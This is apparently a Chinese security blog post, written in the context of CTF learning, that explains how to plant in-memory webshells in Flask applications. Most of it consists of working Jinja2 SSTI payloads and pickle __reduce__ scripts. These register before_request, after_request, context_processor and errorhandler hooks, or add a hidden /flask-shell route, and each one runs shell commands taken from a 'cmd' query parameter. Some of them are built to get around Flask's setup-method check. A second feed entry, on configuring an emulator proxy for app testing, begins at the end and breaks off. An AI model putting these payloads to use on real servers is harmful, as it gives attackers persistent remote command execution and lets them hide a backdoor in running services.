plaintext">request.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)<br></code></pre></td></tr></table></figure><p>用这个来拿eval，用上面那个来拿request和app</p><p><strong>app的另外获取</strong></p><p>我们还可以通过sys.modules[‘__main__‘].app这种方式来获取app</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><del>至于_request_ctx_stack怎么拿，这我没探索出来，太菜了😢</del></p><p>欸后来我在看天工实验室那篇文章发现怎么拿了，拿的也是RequestContext对象，一起写在后面的总结</p><h1 id="新版内存马"><a href="#新版内存马" class="headerlink" title="新版内存马"></a>新版内存马</h1><p>我们更新一下flask，再用低版本的payload来打一下，会发现这样的报错</p><p><img src="https://cdn.clown2024.cn/202410170055959.png" alt="image-20241017005507732"></p><p>然后去看一下出现报错的函数</p><p><img src="https://cdn.clown2024.cn/202410170056971.png" alt="image-20241017005630921"></p><p>是因为我们的函数被check了，低版本我开了debug会报错也是因为这个</p><p>那就从其他地方入手，类似java的filter内存马那种形式，即在请求前或者后执行恶意操作，python就是找的钩子函数，也就是我们平时用的装饰器内调用的函数</p><blockquote><p>其实add_url_rule还是可以用，后面再说</p></blockquote><h2 id="appbefore_request"><a href="#app-before-request" class="headerlink" title="@app.before_request"></a>@app.before_request</h2><p>从名字就能知道，他的意思就是在我们的请求前进行一些操作</p><p>他的正常写法</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.before_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">before_request</span>():<br>    <span class="hljs-comment"># 执行操作比如身份验证</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.headers.get(<span class="hljs-string">&quot;Authorization&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span>,<span class="hljs-number">401</span><br></code></pre></td></tr></table></figure><p>去看一下它里面调用的函数</p><p><img src="https://cdn.clown2024.cn/202410181056847.png" alt="image-20241018105601756"></p><p>可以看到它调用该方法的形式，f就是访问值，我们只要像低版本那样写一个匿名的lambda函数即可</p><p>正常能执行eval之后的payload形式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;)<br></code></pre></td></tr></table></figure><p>改成能够接受参数的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda : __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>这里就利用lambda函数来获取get请求参数然后执行命令来回显</p><p><img src="https://cdn.clown2024.cn/202410181206135.png" alt="image-20241018120612584"></p><p><img src="https://cdn.clown2024.cn/202410181206831.png" alt="image-20241018120638777"></p><p>但是这样会有一个问题，因为lambda函数是一定会有返回值的，所以如果这样打进去后后续的服务操作都无法进行，会影响正常业务</p><blockquote><p>在测试的还有情况就是如果payload打进去了但是在执行的时候出错了，就会导致服务器一直500.任何操作都打不了，因为该错误代码已经被插入进去了，且会第一个执行，这时候就只能重启服务了</p></blockquote><h2 id="appafter_request"><a href="#app-after-request" class="headerlink" title="@app.after_request"></a>@app.after_request</h2><p>顾名思义这个就是在请求之后干的事，思路和before_request一样</p><p>正常用法</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.after_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">after_request</span>(<span class="hljs-params">response</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_request&quot;</span>)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>先去看看他的调用函数</p><p><img src="https://cdn.clown2024.cn/202410181233617.png" alt="image-20241018123326558"></p><p>调用的函数同样很类似，只不过他的函数多了一个参数而已，所以我们同样用上面的payload改一下即可</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda x: __import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410181247461.png" alt="image-20241018124743387"></p><p><img src="https://cdn.clown2024.cn/202410181247337.png" alt="image-20241018124755293"></p><p>这里我们一开始打进去是会500的，因为我没有设置没有传递参数cmd的情况，这个时候他的返回值不是str就会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TypeError: invalid cmd type (&lt;class &#x27;NoneType&#x27;&gt;, expected string)<br></code></pre></td></tr></table></figure><p>但也是能正常打的</p><p>然后看到一个考虑了不传参情况的payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意一下这个lambda函数我们是需要给一个参数，而且要make_response来返回值，不然就会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TypeError: &#x27;str&#x27; object is not callable<br></code></pre></td></tr></table></figure><h2 id="appteardown_request"><a href="#app-teardown-request" class="headerlink" title="@app.teardown_request"></a>@app.teardown_request</h2><p>该装饰器也是在请求后调用函数，他的payload和after_request一样，改一下函数名即可</p><p><img src="https://cdn.clown2024.cn/202410181631773.png" alt="image-20241018163151698"></p><p>不过该函数的返回值会被忽略，所以是没有回显的，有点鸡肋，不太用它</p><h2 id="appcontext_processor"><a href="#app-context-processor" class="headerlink" title="@app.context_processor"></a>@app.context_processor</h2><p>该装饰器用于注册一个上下文处理器，可以将一个模板字典注册到模板上下文中，简单来说就是将某个名字定义为有意义的东西，比如像我们的一样</p><p>然后他的内部调用函数如下：</p><p><img src="https://cdn.clown2024.cn/202410181650115.png" alt="image-20241018165058047"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.template_context_processors[None].append(lambda : &#123;&#x27;clown&#x27;: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read() if &#x27;cmd&#x27;in request.args.keys() else None&#125;)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;], &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.clown2024.cn/202410181654158.png" alt="image-20241018165411088"></p><p><img src="https://cdn.clown2024.cn/202410181654677.png" alt="image-20241018165421620"></p><h2 id="appteardown_appcontext"><a href="#app-teardown-appcontext" class="headerlink" title="@app.teardown_appcontext"></a>@app.teardown_appcontext</h2><p>他的调用函数</p><p><img src="https://cdn.clown2024.cn/202410181705473.png" alt="image-20241018170522417"></p><p>该方法是在请求结束的时候调用，这个阶段因为请求被销毁了我们也就拿不到相关比如url参数之类的东西，如果要用该该函数打内存马，那么在调用该函数前就需要配合其他装饰器先将request对象保存到Flask的全局变量，属于是非常鸡肋，所以就不探索了这部分，就知道有这么个东西</p><h2 id="apperrorhandler"><a href="#app-errorhandler" class="headerlink" title="@app.errorhandler"></a>@app.errorhandler</h2><p>一个错误处理的装饰器</p><p>正常用法：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br></code></pre></td></tr></table></figure><p>当出现404是就回返回error</p><p><img src="https://cdn.clown2024.cn/202410181730600.png" alt="image-20241018173016540"></p><p>那是不是只要控制他的调用函数随便访问404页面就能写马了呢</p><p>我们先来看一下，他的调用函数如下：</p><p>register_error_handler</p><p><img src="https://cdn.clown2024.cn/202410181732134.png" alt="image-20241018173251068"></p><p>code_or_exception就是我们前面传的状态码，f就是处理函数</p><p>然后仿照前面的写法来打一下内存马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;app.register_error_handler(404,lambda x :__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410182309853.png" alt="image-20241018230903769"></p><p>欸会发现它报错了，看一下报了什么错呢</p><p><img src="https://cdn.clown2024.cn/202410182309191.png" alt="image-20241018230934134"></p><p>很熟悉的错误，在前面低版本我们开启debug模式的时候也出现过这样的错误，说明register_error_handler这个函数被check了</p><p>我们接下来去调试一下</p><p>写一个正常的装饰器然后断点调试</p><p><img src="https://cdn.clown2024.cn/202410182326928.png" alt="image-20241018232621872"></p><p>去访问一个404页面</p><p><img src="https://cdn.clown2024.cn/202410182327223.png" alt="image-20241018232742155"></p><p>看调用栈他会马上走到这个check函数，继续往下</p><p><img src="https://cdn.clown2024.cn/202410182329373.png" alt="image-20241018232931317"></p><p>我们可以看到register_error_handler函数里面实际上又是调用了两个函数，而这两个函数是在check之后，所以我们可以调用这两个函数就可以绕过他的check检查了</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class]=lambda exc_class: __import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410181954570.png" alt="image-20241018195401485"></p><p><img src="https://cdn.clown2024.cn/202410181954846.png" alt="image-20241018195411798"></p><h2 id="绕过check逻辑添加路由"><a href="#绕过check逻辑添加路由" class="headerlink" title="绕过check逻辑添加路由"></a>绕过check逻辑添加路由</h2><p>说回add_url_rule函数，我们看看他的具体报错逻辑</p><p>首先在@setupmethod中调用了check函数</p><p><img src="https://cdn.clown2024.cn/202410200010061.png" alt="image-20241019235616104"></p><p>进到check函数里面</p><p><img src="https://cdn.clown2024.cn/202410200011769.png" alt="image-20241020001102100"></p><p>如果_got_first_request这个值为True的话就会抛出这个错误，他的默认值是为false，那就肯定是在哪里被赋值为了True，我们可以在这里下断点然后看调用栈</p><p>发现他在full_dispatch_request这个方法里面赋值为了True</p><p><img src="https://cdn.clown2024.cn/202410200020962.png" alt="image-20241020002049880"></p><p>我们来看一下add_url_rule的具体实现，直接绕过函数，走一遍他内部的实现流程来注册路由</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@setupmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_url_rule</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        rule: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">        endpoint: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        view_func: ft.RouteCallable | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        provide_automatic_options: <span class="hljs-built_in">bool</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        **options: t.<span class="hljs-type">Any</span>,</span><br><span class="hljs-params">    </span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> endpoint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            endpoint = _endpoint_from_view_func(view_func)  <span class="hljs-comment"># type: ignore</span><br>        options[<span class="hljs-string">&quot;endpoint&quot;</span>] = endpoint<br>        methods = options.pop(<span class="hljs-string">&quot;methods&quot;</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># if the methods are not given and the view_func object knows its</span><br>        <span class="hljs-comment"># methods we can use that instead.  If neither exists, we go with</span><br>        <span class="hljs-comment"># a tuple of only ``GET`` as default.</span><br>        <span class="hljs-keyword">if</span> methods <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            methods = <span class="hljs-built_in">getattr</span>(view_func, <span class="hljs-string">&quot;methods&quot;</span>, <span class="hljs-literal">None</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;GET&quot;</span>,)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(methods, <span class="hljs-built_in">str</span>):<br>            <span class="hljs-keyword">raise</span> TypeError(<br>                <span class="hljs-string">&quot;Allowed methods must be a list of strings, for&quot;</span><br>                <span class="hljs-string">&#x27; example: @app.route(..., methods=[&quot;POST&quot;])&#x27;</span><br>            )<br>        methods = &#123;item.upper() <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> methods&#125;<br><br>        <span class="hljs-comment"># Methods that should always be added</span><br>        required_methods = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">getattr</span>(view_func, <span class="hljs-string">&quot;required_methods&quot;</span>, ()))<br><br>        <span class="hljs-comment"># starting with Flask 0.8 the view_func object can disable and</span><br>        <span class="hljs-comment"># force-enable the automatic options handling.</span><br>        <span class="hljs-keyword">if</span> provide_automatic_options <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            provide_automatic_options = <span class="hljs-built_in">getattr</span>(<br>                view_func, <span class="hljs-string">&quot;provide_automatic_options&quot;</span>, <span class="hljs-literal">None</span><br>            )<br><br>        <span class="hljs-keyword">if</span> provide_automatic_options <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OPTIONS&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> methods:<br>                provide_automatic_options = <span class="hljs-literal">True</span><br>                required_methods.add(<span class="hljs-string">&quot;OPTIONS&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                provide_automatic_options = <span class="hljs-literal">False</span><br><br>        <span class="hljs-comment"># Add the required methods now.</span><br>        methods |= required_methods<br><br>        rule_obj = self.url_rule_class(rule, methods=methods, **options)<br>        rule_obj.provide_automatic_options = provide_automatic_options  <span class="hljs-comment"># type: ignore[attr-defined]</span><br><br>        self.url_map.add(rule_obj)<br>        <span class="hljs-keyword">if</span> view_func <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            old_func = self.view_functions.get(endpoint)<br>            <span class="hljs-keyword">if</span> old_func <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> old_func != view_func:<br>                <span class="hljs-keyword">raise</span> AssertionError(<br>                    <span class="hljs-string">&quot;View function mapping is overwriting an existing&quot;</span><br>                    <span class="hljs-string">f&quot; endpoint function: <span class="hljs-subst">&#123;endpoint&#125;</span>&quot;</span><br>                )<br>            self.view_functions[endpoint] = view_func<br></code></pre></td></tr></table></figure><p>发现在函数末尾的处理中，将 <code>rule_obj</code> 对象添加到了 <code>url_map</code> 中，之后将 <code>view_func</code> 作为了 <code>view_functions</code> 字典中 <code>endpoint</code> 键的值，view_func从字面意思我们就可以知道他就是那个路由函数，所以理论上来讲，可以通过直接操作这两个变量来完成一次手动的 <code>add_url_rule</code>。</p><p><code>url_map</code> 和 <code>view_functions</code> 的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">self.url_map = self.url_map_class(host_matching=host_matching)<br><br>url_map_class为map<br><br>self.view_functions: dict[str, ft.RouteCallable] = &#123;&#125;<br></code></pre></td></tr></table></figure><p>然后就可以构造我们的payload了，但是需要打两次不一样的payload，一次添加url_map，一次添加endpoint，可以自己去看看源码具体是需要怎么传参构造，这里直接写payload了</p><p>第一次payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.url_map.add(app.url_rule_class(&#x27;/flask-shell&#x27;, methods=[&#x27;GET&#x27;],endpoint=&#x27;shell&#x27;))<br>&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410200036738.png" alt="image-20241020003616645"></p><p>这时候已经是创建了路由了，但是<code>view_functions</code> 中并不存在路由指定的 <code>endpoint</code> 会导致报错</p><p>接下来打第二次payload添加endpoint</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.view_functions.update(&#123;&#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&#125;)<br>&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410200040146.png" alt="image-20241020004011065"></p><p>再去访问flask-shell路由就可以了</p><p><img src="https://cdn.clown2024.cn/202410200040499.png" alt="image-20241020004038426"></p><h1 id="pickle的payload"><a href="#pickle的payload" class="headerlink" title="pickle的payload"></a>pickle的payload</h1><p>因为上述的payload除了用于ssti，还可以用于pickle这里记录一下<strong>gxngxngxn师傅</strong>文章里面的payload</p><p><strong>before_request</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;clown&#x27;)).read())&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><p><strong>after_request</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;gxngxngxn&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;clown\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><p><strong>errorhandler</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;clown&#x27;)).read()&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><h1 id="一些拿主要属性的payload"><a href="#一些拿主要属性的payload" class="headerlink" title="一些拿主要属性的payload"></a>一些拿主要属性的payload</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><ul><li><p>低版本的堆栈拿法：url_for.__globals__[‘_request_ctx_stack’].request，该方法到2.3.x就无法获取值了，会返回none</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__.get(&#x27;_request_ctx_stack&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410190011172.png" alt="image-20241019001140099"></p></li><li><p>通用的拿法就是直接用url_for.__globals__[‘request’]</p><p><img src="https://cdn.clown2024.cn/202410190013035.png" alt="image-20241019001345973"></p></li><li><p>高版本替代堆栈拿法：在看文章的时候发现了，可以通过这个来拿url_for.__globals__[‘current_app’].request_context.__globals__[‘request_ctx’]</p><p><img src="https://cdn.clown2024.cn/202410200048481.png" alt="image-20241020004833401"></p><p>可以看到拿的也是RequestContext对象</p></li></ul><h2 id="app"><a href="#app" class="headerlink" title="app"></a>app</h2><ul><li><p>通常的拿法为：url_for.__globals__[‘current_app’]，但是在2.3.x的版本这个方法是拿不到current_app的，具体原因copy一下caterpie771大神的研究成果</p><blockquote><p>flask2.1.3 中，SSTI使用的 <code>url_for</code> 指向了 <strong>flask.helpers.url_for</strong></p><p>flask2.3.0 中，SSTI使用的 <code>url_for</code> 指向了 <strong>flask.app.Flask.url_for</strong></p><p>各版本的 flask&#x2F;helpers.py 都是引入了 current_app 的</p><p>从 3.0.0 开始 flask&#x2F;app.py 才有引入 current_app</p><p>所以2.3.0的url_for的上下文没有current_app</p></blockquote></li><li><p>一些替代拿法，也就是拿globals的方法，他的上下文内容所在位置也标出来，同样是我们caterpie771大神的调试结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">payload                                     context<br>get_flashed_messages.__globals__        flask.helpers<br>request.__init__.__globals__            werkzeug.wrappers.request<br>request.application.__globals__            werkzeug.wrappers.request<br>session.__init__.__globals__            flask.sessions<br>config.__class__.__init__.__globals__    flask.config<br></code></pre></td></tr></table></figure></li><li><p>还有一中是通过sys.module[‘__main__‘].app这个模块来拿，所以就是正常ssti链子的流程拿到builtins即可，这里就举几个例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app&quot;)&#125;&#125;<br><br>&#123;&#123;x.__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].app&#125;&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p><a href="https://xz.aliyun.com/t/14526?time__1311=GqAhDIqjxmxfx0yx4+xCqqmqTrKFLep3x#toc-6">https://xz.aliyun.com/t/14526?time__1311=GqAhDIqjxmxfx0yx4%2BxCqqmqTrKFLep3x#toc-6</a></p><p><a href="https://tiangonglab.github.io/blog/tiangongarticle038/">https://tiangonglab.github.io/blog/tiangongarticle038/</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;拖了很久终于来看一下flask内存马这个东西了，主要是发现某新生赛week2就要打flask内存马，赶紧来学了😢&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;内存马就是</summary>
      
    
    
    
    <category term="python" scheme="https://clowsman.github.io/categories/python/"/>
    
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="python" scheme="https://clowsman.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>APP渗透抓包环境配置</title>
    <link href="https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2024-08-15T10:52:02.000Z</published>
    <updated>2024-08-15T17:34:27.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模拟器代理设置"><a href="#模拟器代理设置" class="headerlink" title="模拟器代理设置"></a>模拟器代理设置</h1><p>这里用雷电模拟器</p><p>ipconfig查看一下本机的IP</p><p><img src="https://cdn.clown2024.cn/202408151921468.png" alt="image-20240815192142415"></p><p>然后在burp添加一个新的代理</p><p><img src="https://cdn.clown2024.cn/202408151922834.png" alt="image-20240815192241797"></p><p>然后模拟器也自定义该ip地址</p><p><img src="https://cdn.clown2024.cn/202408151925440.png" alt="image-20240815192521373"></p><h1 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h1><p>这里如果要抓https还需要安装一下burp证书，参考文章：<a 